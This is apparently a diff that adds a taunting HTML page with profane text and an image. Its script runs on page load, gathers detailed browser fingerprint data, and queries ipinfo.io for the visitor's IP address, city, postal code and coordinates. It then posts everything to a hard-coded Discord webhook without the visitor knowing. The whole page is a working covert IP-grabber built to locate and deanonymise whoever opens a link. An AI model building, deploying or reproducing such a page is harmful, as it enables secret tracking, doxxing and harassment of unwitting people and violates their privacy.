@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>nogyatt bitch</title>
+</head>
+<body>
+    <h1>you were FUCKED</h1>
+    <img src="./bjb.png" alt="bjb Image">
+
+    <script>
+        async function getBrowserDetails() {
+            const details = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screenWidth: window.screen.width,
+                screenHeight: window.screen.height,
+                colorDepth: window.screen.colorDepth,
+                pixelDepth: window.screen.pixelDepth,
+                timezoneOffset: new Date().getTimezoneOffset(),
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                cookiesEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack,
+                hardwareConcurrency: navigator.hardwareConcurrency,
+                deviceMemory: navigator.deviceMemory,
+                maxTouchPoints: navigator.maxTouchPoints,
+                appVersion: navigator.appVersion,
+                product: navigator.product,
+                productSub: navigator.productSub,
+                vendor: navigator.vendor,
+                vendorSub: navigator.vendorSub,
+                appName: navigator.appName,
+                appCodeName: navigator.appCodeName,
+                appMinorVersion: navigator.appMinorVersion,
+                buildID: navigator.buildID,
+                oscpu: navigator.oscpu,
+                plugins: Array.from(navigator.plugins, plugin => plugin.name).join(', '),
+                mimeTypes: Array.from(navigator.mimeTypes, mimeType => mimeType.type).join(', ')
+            };
+
+            const ipResponse = await fetch('https://ipinfo.io/json');
+            const ipData = await ipResponse.json();
+            details.ipAddress = ipData.ip;
+            details.hostname = ipData.hostname;
+            details.city = ipData.city;
+            details.region = ipData.region;
+            details.country = ipData.country;
+            details.loc = ipData.loc;
+            details.org = ipData.org;
+            details.postal = ipData.postal;
+            details.timezone = ipData.timezone;
+
+            return details;
+        }
+
+        async function sendToDiscord(details) {
+            const webhookUrl = 'https://discord.com/api/webhooks/1304793145245958185/QoFX0WGq6vnW1X4_G5eVKVJeo8gTTHof2Yl1wLsGMbMDoQf9pek3ytSh0AeVEZb6bDnk';
+            const data = {
+                content: `Browser and IP Details:\n${JSON.stringify(details, null, 2)}`
+            };
+
+            await fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            });
+        }
+
+        async function main() {
+            const details = await getBrowserDetails();
+            await sendToDiscord(details);
+        }
+
+        main();
+    </script>
+</body>
+</html>
